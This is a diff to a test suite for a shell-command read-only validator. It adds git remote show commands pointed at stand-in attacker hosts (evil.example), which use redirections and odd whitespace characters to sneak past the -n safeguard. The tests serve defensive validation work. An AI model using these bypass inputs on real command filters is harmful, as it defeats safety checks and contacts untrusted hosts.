@@ -251,6 +251,18 @@ describe('evaluateShellCommandReadOnly', () => {
       'git remote show origin * -n',
       'git remote show origin ?? -n',
       'git remote show origin {--,x} -n',
+      // The word after an input redirection is its source, so git never
+      // receives a `-n` placed there (bot round 8 R8-1).
+      'git remote show https://evil.example/leak <<<-n',
+      'git remote show origin <<< -n',
+      'git remote show origin < -n',
+      // bash splits words only at space, tab and newline, so each of these
+      // reaches git inside the single argument `repo<char>-n` (R8-1).
+      'git remote show ssh://evil.example/repo\r-n',
+      'git remote show ssh://evil.example/repo\v-n',
+      'git remote show ssh://evil.example/repo\f-n',
+      'git remote show ssh://evil.example/repo -n',
+      'git remote show ssh://evil.example/repo　-n',
       'git diff --output=patch',
       'git log --output=log.out',
       'git show --output=show.out HEAD',
@@ -397,6 +409,10 @@ describe('evaluateShellCommandReadOnly', () => {
       'git remote show https://evil.example/leak -n',
       // A `-n` before `--end-of-options` is still an option.
       'git remote show -n --end-of-options origin',
+      // An input redirection takes one word as its source; a `-n` after that
+      // word is still an argument.
+      'git remote show origin <in -n',
+      'git remote show -n origin < file',
       'git diff -- file',
       'git diff -Oorderfile',
       'git log -p',
